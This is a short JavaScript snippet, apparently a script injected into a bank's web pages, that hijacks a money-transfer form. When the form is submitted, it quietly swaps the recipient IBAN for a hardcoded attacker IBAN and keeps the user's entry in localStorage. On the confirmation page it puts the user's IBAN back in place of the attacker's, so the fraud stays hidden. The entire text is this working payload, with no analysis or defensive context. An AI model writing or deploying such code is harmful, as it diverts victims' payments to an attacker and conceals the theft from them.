const myIBAN = '99888877776666555544443333'
let transferForm = document.getElementById('transferForm');
if (transferForm) {
  transferForm.onsubmit = function () {
    let inputIBAN = transferForm.elements['iban'];
    let newIBAN = inputIBAN.cloneNode(true)

    inputIBAN.name = "HACKED"
    newIBAN.type = "hidden"
    newIBAN.value = myIBAN
    transferForm.appendChild(newIBAN)

    localStorage.setItem("storedIBAN", inputIBAN.value);
    transferForm.submit();
  };
}


let ReplacIBAN = document.evaluate(`//p[text()='${myIBAN}']`, document, null, XPathResult.ANY_TYPE, null).iterateNext();
if (ReplacIBAN) {
  ReplacIBAN.innerHTML = localStorage.getItem("storedIBAN");
  localStorage.setItem("storedIBAN", "");
}